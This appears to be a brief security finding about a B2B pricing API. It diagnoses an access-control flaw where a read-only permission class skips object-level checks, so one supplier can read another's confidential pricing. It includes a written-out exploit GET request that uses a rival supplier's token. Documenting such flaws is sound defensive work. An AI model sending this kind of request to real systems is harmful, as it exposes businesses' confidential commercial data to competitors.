diagnosis: WholesalePriceMatrixDetailView uses IsSupplierAccountOrReadOnly, which skips object-level permission verification on safe HTTP methods. Competing supplier accounts can issue GET requests using known matrix codes to inspect other suppliers' volume discount thresholds, unit production costs, and confidential commercial rebate structures.
exploit_request:
GET /api/b2b/pricing-matrices/MAT-GLOBAL-TIER3/ HTTP/1.1
Host: wholesale.procurecloud.com
Authorization: Bearer supplier_rival_token
Accept: application/json
